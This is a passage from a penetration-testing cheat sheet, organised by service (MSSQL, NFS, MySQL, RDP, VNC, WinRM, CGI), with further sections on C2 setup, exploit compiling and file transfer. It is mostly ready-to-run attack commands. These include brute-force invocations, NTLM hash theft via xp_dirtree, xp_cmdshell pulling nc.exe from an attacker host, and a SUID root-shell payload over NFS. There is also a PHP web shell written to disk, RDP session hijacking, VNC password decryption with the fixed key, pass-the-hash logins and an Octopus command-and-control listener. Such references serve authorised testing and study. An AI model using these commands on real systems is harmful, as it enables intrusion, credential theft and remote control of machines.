./cve_2017_7494.py -t <span class="hljs-variable">&lt;TARGET_IP&gt;</span> -u <span class="hljs-variable">&lt;USER&gt;</span> -P <span class="hljs-variable">&lt;PASSWORD&gt;</span> --custom=test.so</code></pre></div>
<hr>
<h2 id="mssql-1433">MSSQL - 1433</h2>
<h3 id="get-information">Get information</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;IP&gt;</pre><pre class="hljs"><code><span class="hljs-keyword">nmap</span> --script ms-sql-info,ms-sql-<span class="hljs-built_in">empty</span>-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-<span class="hljs-keyword">args</span> mssql.instance-port=<span class="hljs-number">1433</span>,mssql.username=<span class="hljs-keyword">sa</span>,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -<span class="hljs-keyword">p</span> <span class="hljs-number">1433</span> <span class="hljs-symbol">&lt;IP&gt;</span></code></pre></div>
<h3 id="brute-force-6">Brute force</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; mssql -vV -I -u</pre><pre class="hljs"><code>hydra -L <span class="hljs-tag">&lt;<span class="hljs-name">USERS_LIST</span>&gt;</span> -P <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> mssql -vV -I -u</code></pre></div>
<h3 id="having-credentials">Having credentials</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">mssqlclient.py -windows-auth &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
mssqlclient.py &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;

# Once logged in you can run queries:
SQL&gt; select @@ version;

# Steal NTLM hash
sudo smbserver.py -smb2support liodeus .
SQL&gt; exec master..xp_dirtree '\\&lt;IP&gt;\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

# Try to enable code execution
SQL&gt; enable_xp_cmdshell

# Execute code
SQL&gt; xp_cmdshell whoami /all
SQL&gt; xp_cmdshell certutil.exe -urlcache -split -f http://&lt;IP&gt;/nc.exe</pre><pre class="hljs"><code>mssqlclient.py -windows-auth <span class="hljs-variable">&lt;DOMAIN&gt;</span>/<span class="hljs-variable">&lt;USER&gt;</span>:<span class="hljs-variable">&lt;PASSWORD&gt;</span>@<span class="hljs-variable">&lt;IP&gt;</span>
mssqlclient.py <span class="hljs-variable">&lt;USER&gt;</span>:<span class="hljs-variable">&lt;PASSWORD&gt;</span>@<span class="hljs-variable">&lt;IP&gt;</span>

<span class="hljs-comment"># Once logged in you can run queries:</span>
SQL&gt; select @@ version;

<span class="hljs-comment"># Steal NTLM hash</span>
sudo smbserver.py -smb2support liodeus .
SQL&gt; exec master..xp_dirtree &#x27;\\<span class="hljs-variable">&lt;IP&gt;</span>\liodeus\&#x27; <span class="hljs-comment"># Steal the NTLM hash, crack it with john or hashcat</span>

<span class="hljs-comment"># Try to enable code execution</span>
SQL&gt; enable_xp_cmdshell

<span class="hljs-comment"># Execute code</span>
SQL&gt; xp_cmdshell whoami /<span class="hljs-literal">all</span>
SQL&gt; xp_cmdshell certutil.exe -urlcache -split -f http://<span class="hljs-variable">&lt;IP&gt;</span>/nc.exe</code></pre></div>
<h3 id="manual-exploit">Manual exploit</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Cheatsheet :
    - https://www.asafety.fr/mssql-injection-cheat-sheet/</pre><pre class="hljs"><code>Cheatsheet :
    - https:<span class="hljs-regexp">//</span>www.asafety.fr<span class="hljs-regexp">/mssql-injection-cheat-sheet/</span></code></pre></div>
<hr>
<h2 id="nfs-2049">NFS - 2049</h2>
<h3 id="show-mountable-nfs-shares">Show Mountable NFS Shares</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">showmount -e &lt;IP&gt;
nmap --script=nfs-showmount -oN mountable_shares &lt;IP&gt;</pre><pre class="hljs"><code>showmount -<span class="hljs-keyword">e</span> <span class="hljs-symbol">&lt;IP&gt;</span>
<span class="hljs-keyword">nmap</span> --script=nfs-showmount -oN mountable_shares <span class="hljs-symbol">&lt;IP&gt;</span></code></pre></div>
<h3 id="mount-a-share">Mount a share</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">sudo mount -v -t nfs &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;
sudo mount -v -t nfs -o vers=2 &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;</pre><pre class="hljs"><code>sudo mount -v -t nfs <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">SHARE</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">DIRECTORY</span>&gt;</span>
sudo mount -v -t nfs -o vers=2 <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">SHARE</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">DIRECTORY</span>&gt;</span></code></pre></div>
<h3 id="nfs-misconfigurations">NFS misconfigurations</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># List exported shares
cat /etc/exports</pre><pre class="hljs"><code><span class="hljs-comment"># List exported shares</span>
cat <span class="hljs-regexp">/etc/</span>exports</code></pre></div>
<p>If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Attacker, as root user

mkdir &lt;DIRECTORY&gt;
mount -v -t nfs &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;
cd &lt;DIRECTORY&gt;
echo 'int main(void){setreuid(0,0); system(&quot;/bin/bash&quot;); return 0;}' &gt; pwn.c
gcc pwn.c -o pwn
chmod +s pwn

# Victim

cd &lt;SHARE&gt;
./pwn # Root shell</pre><pre class="hljs"><code># Attacker, <span class="hljs-keyword">as</span> root user

<span class="hljs-built_in">mkdir</span> <span class="hljs-symbol">&lt;DIRECTORY&gt;</span>
mount -v -t nfs <span class="hljs-symbol">&lt;IP&gt;</span>:<span class="hljs-symbol">&lt;SHARE&gt;</span> <span class="hljs-symbol">&lt;DIRECTORY&gt;</span>
<span class="hljs-keyword">cd</span> <span class="hljs-symbol">&lt;DIRECTORY&gt;</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;int main(void){setreuid(0,0); system(&quot;/bin/bash&quot;); return 0;}&#x27;</span> &gt; pwn.<span class="hljs-keyword">c</span>
gcc pwn.<span class="hljs-keyword">c</span> -<span class="hljs-keyword">o</span> pwn
chmod +s pwn

# Victim

<span class="hljs-keyword">cd</span> <span class="hljs-symbol">&lt;SHARE&gt;</span>
./pwn # Root <span class="hljs-keyword">shell</span></code></pre></div>
<hr>
<h2 id="mysql-3306">MYSQL - 3306</h2>
<h3 id="brute-force-7">Brute force</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; mysql -vV -I -u</pre><pre class="hljs"><code>hydra -L <span class="hljs-tag">&lt;<span class="hljs-name">USERS_LIST</span>&gt;</span> -P <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> mysql -vV -I -u</code></pre></div>
<h3 id="extracting-mysql-credentials-from-files">Extracting MySQL credentials from files</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">cat /etc/mysql/debian.cnf
grep -oaE &quot;[-_\.\*a-Z0-9]{3,}&quot; /var/lib/mysql/mysql/user.MYD | grep -v &quot;mysql_native_password&quot;</pre><pre class="hljs"><code>cat <span class="hljs-regexp">/etc/my</span>sql/debian.cnf
<span class="hljs-keyword">grep</span> -oaE <span class="hljs-string">&quot;[-_\.\*a-Z0-9]{3,}&quot;</span> <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/mysql/my</span>sql/user.MYD | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;mysql_native_password&quot;</span></code></pre></div>
<h3 id="connect">Connect</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Local
mysql -u &lt;USER&gt;
mysql -u &lt;USER&gt; -p

# Remote
mysql -h &lt;IP&gt; -u &lt;USER&gt;</pre><pre class="hljs"><code><span class="hljs-comment"># Local</span>
mysql -u <span class="hljs-variable">&lt;USER&gt;</span>
mysql -u <span class="hljs-variable">&lt;USER&gt;</span> -p

<span class="hljs-comment"># Remote</span>
mysql -h <span class="hljs-variable">&lt;IP&gt;</span> -u <span class="hljs-variable">&lt;USER&gt;</span></code></pre></div>
<h3 id="mysql-commands">MySQL commands</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">show databases;
use &lt;DATABASES&gt;;

show tables;
describe &lt;TABLE&gt;;

select * from &lt;TABLE&gt;;

# Try to execute code
select do_system('id');
\! sh

# Read &amp; Write
select load_file('&lt;FILE&gt;');
select 1,2,&quot;&lt;?php echo shell_exec($_GET['c']);?&gt;&quot;,4 into OUTFILE '&lt;OUT_FILE&gt;'</pre><pre class="hljs"><code><span class="hljs-keyword">show</span> databases;
use &lt;DATABASES&gt;;

<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;
describe &lt;<span class="hljs-keyword">TABLE</span>&gt;;

<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;<span class="hljs-keyword">TABLE</span>&gt;;

# Try <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span> code
<span class="hljs-keyword">select</span> do_system(<span class="hljs-string">&#x27;id&#x27;</span>);
\! sh

# <span class="hljs-keyword">Read</span> &amp; <span class="hljs-keyword">Write</span>
<span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;&lt;FILE&gt;&#x27;</span>);
<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,&quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot;,<span class="hljs-number">4</span> <span class="hljs-keyword">into</span> OUTFILE <span class="hljs-string">&#x27;&lt;OUT_FILE&gt;&#x27;</span></code></pre></div>
<h3 id="manual-exploit-2">Manual exploit</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Cheatsheet :
    - https://www.asafety.fr/mysql-injection-cheat-sheet/</pre><pre class="hljs"><code>Cheatsheet :
    - https:<span class="hljs-regexp">//</span>www.asafety.fr<span class="hljs-regexp">/mysql-injection-cheat-sheet/</span></code></pre></div>
<hr>
<h2 id="rdp-3389">RDP - 3389</h2>
<h3 id="brute-force-8">Brute force</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">crowbar -b rdp -s &lt;IP&gt;/CIDR -u &lt;USER&gt; -C &lt;PASSWORDS_LIST&gt;
crowbar -b rdp -s &lt;IP&gt;/CIDR -U &lt;USERS_LIST&gt; -C &lt;PASSWORDS_LIST&gt;

hydra -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; rdp://&lt;IP&gt; -u -vV</pre><pre class="hljs"><code>crowbar -b rdp -s <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span>/CIDR -u <span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span> -C <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span>
crowbar -b rdp -s <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span>/CIDR -U <span class="hljs-tag">&lt;<span class="hljs-name">USERS_LIST</span>&gt;</span> -C <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span>

hydra -f -L <span class="hljs-tag">&lt;<span class="hljs-name">USERS_LIST</span>&gt;</span> -P <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span> rdp://<span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> -u -vV</code></pre></div>
<h3 id="connect-with-known-credentials-hash">Connect with known credentials / hash</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">rdesktop -u &lt;USERNAME&gt; &lt;IP&gt;
rdesktop -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;IP&gt;

xfreerdp /u:[DOMAIN\]&lt;USERNAME&gt; /p:&lt;PASSWORD&gt; /v:&lt;IP&gt;
xfreerdp /u:[DOMAIN\]&lt;USERNAME&gt; /pth:&lt;HASH&gt; /v:&lt;IP&gt;</pre><pre class="hljs"><code>rdesktop -u <span class="hljs-tag">&lt;<span class="hljs-name">USERNAME</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span>
rdesktop -d <span class="hljs-tag">&lt;<span class="hljs-name">DOMAIN</span>&gt;</span> -u <span class="hljs-tag">&lt;<span class="hljs-name">USERNAME</span>&gt;</span> -p <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORD</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span>

xfreerdp /u:[DOMAIN\]<span class="hljs-tag">&lt;<span class="hljs-name">USERNAME</span>&gt;</span> /p:<span class="hljs-tag">&lt;<span class="hljs-name">PASSWORD</span>&gt;</span> /v:<span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span>
xfreerdp /u:[DOMAIN\]<span class="hljs-tag">&lt;<span class="hljs-name">USERNAME</span>&gt;</span> /pth:<span class="hljs-tag">&lt;<span class="hljs-name">HASH</span>&gt;</span> /v:<span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span></code></pre></div>
<h3 id="session-stealing">Session stealing</h3>
<h4 id="get-openned-sessions">Get openned sessions</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">query user</pre><pre class="hljs"><code>query <span class="hljs-keyword">user</span></code></pre></div>
<h4 id="access-to-the-selected">Access to the selected</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">tscon &lt;ID&gt; /dest:&lt;SESSIONNAME&gt;</pre><pre class="hljs"><code>tscon <span class="hljs-tag">&lt;<span class="hljs-name">ID</span>&gt;</span> /dest:<span class="hljs-tag">&lt;<span class="hljs-name">SESSIONNAME</span>&gt;</span></code></pre></div>
<h3 id="adding-user-to-rdp-group-windows">Adding user to RDP group (Windows)</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">net localgroup &quot;Remote Desktop Users&quot; &lt;USER&gt; /add</pre><pre class="hljs"><code>net localgroup <span class="hljs-string">&quot;Remote Desktop Users&quot;</span> &lt;<span class="hljs-keyword">USER</span>&gt; /<span class="hljs-keyword">add</span></code></pre></div>
<hr>
<h2 id="vnc-5800-58001-5900-5901">VNC - 5800 - 58001 - 5900 - 5901</h2>
<h3 id="scans-2">Scans</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p &lt;PORT&gt; &lt;IP&gt;</pre><pre class="hljs"><code><span class="hljs-keyword">nmap</span> -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;PORT&gt;</span> <span class="hljs-symbol">&lt;IP&gt;</span></code></pre></div>
<h3 id="brute-force-9">Brute force</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hydra -L &lt;USERS_LIST&gt; –P &lt;PASSWORDS_LIST&gt; -s &lt;PORT&gt; &lt;IP&gt; vnc -u -vV</pre><pre class="hljs"><code>hydra -L <span class="hljs-tag">&lt;<span class="hljs-name">USERS_LIST</span>&gt;</span> –P <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span> -s <span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> vnc -u -vV</code></pre></div>
<h3 id="connect-2">Connect</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">vncviewer &lt;IP&gt;:&lt;PORT&gt;</pre><pre class="hljs"><code>vncviewer &lt;IP&gt;<span class="hljs-symbol">:&lt;PORT&gt;</span></code></pre></div>
<h3 id="found-vnc-password">Found VNC password</h3>
<h4 id="linux">Linux</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Default password is stored in: ~/.vnc/passwd</pre><pre class="hljs"><code><span class="hljs-keyword">Default</span> password <span class="hljs-keyword">is</span> <span class="hljs-keyword">stored</span> <span class="hljs-keyword">in</span>: ~/.vnc/passwd</code></pre></div>
<h4 id="windows">Windows</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

# TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server

# TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

# UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini</pre><pre class="hljs"><code><span class="hljs-comment"># RealVNC</span>
HKEY_LOCAL_MACHINE<span class="hljs-string">\SOFTWARE\RealVNC\vncserver</span>

<span class="hljs-comment"># TightVNC</span>
HKEY_CURRENT_USER<span class="hljs-string">\Software\TightVNC\Server</span>

<span class="hljs-comment"># TigerVNC</span>
HKEY_LOCAL_USER<span class="hljs-string">\Software\TigerVNC\WinVNC4</span>

<span class="hljs-comment"># UltraVNC</span>
C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\UltraVNC\ultravnc.ini</span></code></pre></div>
<h3 id="decrypt-vnc-password">Decrypt VNC password</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">msfconsole
irb
fixedkey = &quot;\x17\x52\x6b\x06\x23\x4e\x58\x07&quot;
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt [&quot;2151D3722874AD0C&quot;].pack('H*'), fixedkey
/dev/nul</pre><pre class="hljs"><code>msfconsole
irb
fixedkey = <span class="hljs-string">&quot;\x17\x52\x6b\x06\x23\x4e\x58\x07&quot;</span>
<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;rex/proto/rfb&#x27;</span>
Rex::Proto::RFB::Cipher.decrypt [<span class="hljs-string">&quot;2151D3722874AD0C&quot;</span>].pack(<span class="hljs-string">&#x27;H*&#x27;</span>), fixedkey
/dev/nul</code></pre></div>
<hr>
<h2 id="winrm-5985-5986">WINRM - 5985 - 5986</h2>
<h3 id="brute-force-10">Brute force</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">crackmapexec winrm &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;</pre><pre class="hljs"><code>crackmapexec winrm <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> -u <span class="hljs-tag">&lt;<span class="hljs-name">USERS_LIST</span>&gt;</span> -p <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span></code></pre></div>
<h3 id="connecting">Connecting</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -H &lt;HASH&gt;</pre><pre class="hljs"><code>evil-winrm -i <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> -u <span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span> -p <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORD</span>&gt;</span>
evil-winrm -i <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> -u <span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span> -H <span class="hljs-tag">&lt;<span class="hljs-name">HASH</span>&gt;</span></code></pre></div>
<hr>
<h2 id="cgi">CGI</h2>
<h3 id="found-cgi-scripts">Found CGI scripts</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">ffuf -w /usr/share/seclists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u &lt;URL&gt;/ccgi-bin/FUZZ -t 50
ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u &lt;URL&gt;/ccgi-bin/FUZZ -t 50
ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u &lt;URL&gt;/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100</pre><pre class="hljs"><code>ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>CGI-XPlatform.fuzz.txt -u &lt;URL&gt;<span class="hljs-regexp">/ccgi-bin/</span>FUZZ -t <span class="hljs-number">50</span>
ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>CGIs.txt -u &lt;URL&gt;<span class="hljs-regexp">/ccgi-bin/</span>FUZZ -t <span class="hljs-number">50</span>
ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster<span class="hljs-regexp">/directory-list-lowercase-2.3-medium.txt -u &lt;URL&gt;/</span>cgi-bin/FUZZ -e .sh,.pl,.cgi -t <span class="hljs-number">100</span></code></pre></div>
<p>If a script is found try <a data-from-md title='#shellshock' href='#shellshock'>SHELLSHOCK</a>.</p>
<hr>
<h2 id="command-and-control-framework">Command and control framework</h2>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Download
git clone https://github.com/mhaskar/Octopus/tree/v1.2

# Install requirements
pip install -r requirements.txt

# Usage
./octopus.py

# Listener (exemple)
listen_http &lt;BIND_IP&gt; &lt;BIND_PORT&gt; &lt;HOSTNAME&gt; &lt;INTERVAL_IN_SECONDS&gt; &lt;URL&gt; &lt;LISTENER_NAME&gt;
listen_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1

# Agent (exemple)
generate_powershell &lt;LISTENER_NAME&gt;
generate_powershell listener_1</pre><pre class="hljs"><code><span class="hljs-comment"># Download</span>
git clone https://github.com/mhaskar/Octopus/tree/v1.2

<span class="hljs-comment"># Install requirements</span>
pip install -r requirements.txt

<span class="hljs-comment"># Usage</span>
./octopus.py

<span class="hljs-comment"># Listener (exemple)</span>
listen_http <span class="hljs-variable">&lt;BIND_IP&gt;</span> <span class="hljs-variable">&lt;BIND_PORT&gt;</span> <span class="hljs-variable">&lt;HOSTNAME&gt;</span> <span class="hljs-variable">&lt;INTERVAL_IN_SECONDS&gt;</span> <span class="hljs-variable">&lt;URL&gt;</span> <span class="hljs-variable">&lt;LISTENER_NAME&gt;</span>
listen_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1

<span class="hljs-comment"># Agent (exemple)</span>
generate_powershell <span class="hljs-variable">&lt;LISTENER_NAME&gt;</span>
generate_powershell listener_1</code></pre></div>
<hr>
<h2 id="compiling-exploits">Compiling exploits</h2>
<h3 id="for-linux">For linux</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># 64 bits
gcc -o exploit exploit.c

# 32 bits
gcc -m32 -o exploit exploit.c</pre><pre class="hljs"><code><span class="hljs-attr"># 64</span> bits
gcc -o exploit exploit.c

<span class="hljs-attr"># 32</span> bits
gcc -<span class="hljs-name">m32</span> -o exploit exploit.c</code></pre></div>
<h3 id="for-windows">For windows</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">To compile Win32 bit executables, execute i686-w64-mingw32-gcc -o &lt;FILE.exe&gt; &lt;FILE.c&gt;
To compile Win64 bit executables, execute x86_64-w64-mingw32-gcc -o &lt;FILE.exe&gt;&lt;FILE.c&gt;
To Compiled .cpp source file, execute i586-mingw32msvc-g++ -o &lt;FILE&gt;.exe &lt;FILE&gt;.cpp
To compile python scripts, pyinstaller --onefile &lt;SCRIPT.py&gt;

# Compile windows .exe on Linux
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</pre><pre class="hljs"><code>To compile Win32 bit executables,<span class="hljs-built_in"> execute </span>i686-w64-mingw32-gcc -o &lt;FILE.exe&gt; &lt;FILE.c&gt;
To compile Win64 bit executables,<span class="hljs-built_in"> execute </span>x86_64-w64-mingw32-gcc -o &lt;FILE.exe&gt;&lt;FILE.c&gt;
To Compiled .cpp source file,<span class="hljs-built_in"> execute </span>i586-mingw32msvc-g++ -o &lt;FILE&gt;.exe &lt;FILE&gt;.cpp
To compile python scripts, pyinstaller --onefile &lt;SCRIPT.py&gt;

<span class="hljs-comment"># Compile windows .exe on Linux</span>
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></pre></div>
<h3 id="cross-compile">Cross compile</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c</pre><pre class="hljs"><code>gcc -m32 -Wall -Wl,<span class="hljs-attribute">--hash-style</span>=both -o gimme.o gimme.c</code></pre></div>
<hr>
<h2 id="dictionary-generation">DICTIONARY GENERATION</h2>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">cewl -m &lt;WORDS_SIZE&gt; --with-numbers -w dictiFromWebsite &lt;URL&gt; -d &lt;DEPTH&gt;</pre><pre class="hljs"><code>cewl -m <span class="hljs-tag">&lt;<span class="hljs-name">WORDS_SIZE</span>&gt;</span> --with-numbers -w dictiFromWebsite <span class="hljs-tag">&lt;<span class="hljs-name">URL</span>&gt;</span> -d <span class="hljs-tag">&lt;<span class="hljs-name">DEPTH</span>&gt;</span></code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt</pre><pre class="hljs"><code>crunch <span class="hljs-number">5</span> <span class="hljs-number">5</span> -f <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/crunch/</span>charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt</code></pre></div>
<hr>
<h2 id="file-transfer">FILE TRANSFER</h2>
<h3 id="linux-2">Linux</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># PYTHON
python -m SimpleHTTPServer &lt;PORT&gt;
python2.7 -c &quot;from urllib import urlretrieve; urlretrieve('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')&quot;

# FTP
sudo python3 -m pyftpdlib  -p 21 -w

# SMB
sudo smbserver.py -smb2support liodeus .

# WGET
wget &lt;URL&gt; -o &lt;OUT_FILE&gt;

# CURL
curl &lt;URL&gt; -o &lt;OUT_FILE&gt;

# NETCAT
nc -lvp 1234 &gt; &lt;OUT_FILE&gt; 
nc &lt;IP&gt; 1234 &lt; &lt;IN_FILE&gt; 

# SCP
